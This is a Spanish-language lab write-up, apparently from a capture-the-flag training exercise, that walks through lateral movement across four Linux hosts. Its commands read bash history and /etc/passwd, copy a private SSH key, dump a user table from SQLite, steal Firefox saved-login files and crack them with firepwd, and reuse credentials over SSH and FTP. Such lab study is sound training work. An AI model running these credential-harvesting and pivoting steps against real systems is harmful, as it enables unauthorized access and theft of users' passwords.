
Vamos a  ver diferentes ejemplos para Lateral movement en Linux.

Tenemos la ip 192.116.3.2

El primer paso es un scan de la red para ver que host hay disponibles (host discovery).

![[Pasted image 20250305092621.png]]


![[Pasted image 20250305092604.png]]

Tenemos 4 targets diferentes.
## Host 1

Se nos dan el usuario y la pass.

Simplemente con el comando

```bash
ssh sansa@192.116.3.3
#Cuando pide la pass es welcome
```

Es muy importante revisar el contenido del archivo .bash_history, puede revelar comandos interesantes.

![[Pasted image 20250305093022.png]]

Aquí podemos observar como pudo realizar otra conexión ssh mediante el id_rsa que está en la carpeta del usuario sansa y conectarse a kate en el segundo host.

## host 2

```bash
#Descargar el id_rsa
scp sansa@192.116.3.3:~/id_rsa ./

#Conectarse al segnudo host. Acordarse de los permisos del id_rsa
ssh -i id_rsa kate@192.116.3.4
```

Importante también revisar el /etc/pass para ver los usuarios del sistema.

![[Pasted image 20250305093422.png]]

Podemos ver que hay un usuario bronn

![[Pasted image 20250305093440.png]]

También vemos que en /home hay un archivo database.sqlite que se puede leer así que vamos a ver que contiene

```bash
#Conexión a la base de datos
sqlite3 database.sqlite

#Ver tablas
.tables

#Ver los usuarios
select * from users;
```

![[Pasted image 20250305093647.png]]

Si nos fijamos en el string que tiene el usuario con el bit 1 podemos intentar logearnos en bronn cono ese string.

![[Pasted image 20250305093750.png]]

Si seguimos observando el usuario de Kate podemos ver que contiene directorios interesantes.

![[Pasted image 20250305093933.png]]

![[Pasted image 20250305094005.png]]

Aquí se nos muestran varios archivos interesantes que vamos a descargar para analizarlos.

```bash

# vamos a descargar el archivo key4.db y logins.json
scp -i id_rsa kate@192.116.3.4:~/ .mozilla/firefoz/sj1c9rus.default/key4.db ./
scp -i id_rsa kate@192.116.3.4:~/ .mozilla/firefoz/sj1c9rus.default/logins.json ./

# Vamos a utilizar la herramienta de crackeo de master password de firefox conocida como firepwd
cd firepwd/
python firepwd.py -d /root/

```

![[Pasted image 20250305094424.png]]

Supuestamente lo ha logrado y la password para el usuario bran es ce001480.

## Host 3

```bash
ssh -i id_rsa bran@192.116.3.5
#Si nos pide la pass la tenemos ce001480.
```

Aquí podemos observar que hay los siguientes usuarios

![[Pasted image 20250305094730.png]]

Si analizamos usuario a usuario sus directorios podemos encontrar datos de interés.

![[Pasted image 20250305094807.png]]

Es posible que se trate de una pass para su usario o para el FTP que corre en el sistema.

```bash
#Conexión ftp
ftp 192.116.3.5 21
#usuario dany y pass la de antes
```

![[Pasted image 20250305094942.png]]

Parece que también tiene aquí un archivo con contraseñas y es el mismo de antes.

```bash
#Vamos a intentar conectarnos mediante SSH. Pero en el host 1
ssh dany@192.116.3.3
#Ponemos la pass de antes
```

![[Pasted image 20250305095236.png]]

Parece que tenemos otra flag.

## Host 4

Si nos acordamos de las imágenes de antes con las passwd de bronn

![[Pasted image 20250305093647.png]]

Podemos intentar iniciar sesión con la passwd de Machine 4

```bash
ssh broon@192.116.3.6
```

![[Pasted image 20250305095805.png]]

También podemos ver los diferentes users

![[Pasted image 20250305095833.png]]

Importante ver también los mails de los usuarios.

![[Pasted image 20250305095900.png]]

Este nos da el passwd del usuario de robert.

![[Pasted image 20250305095939.png]]
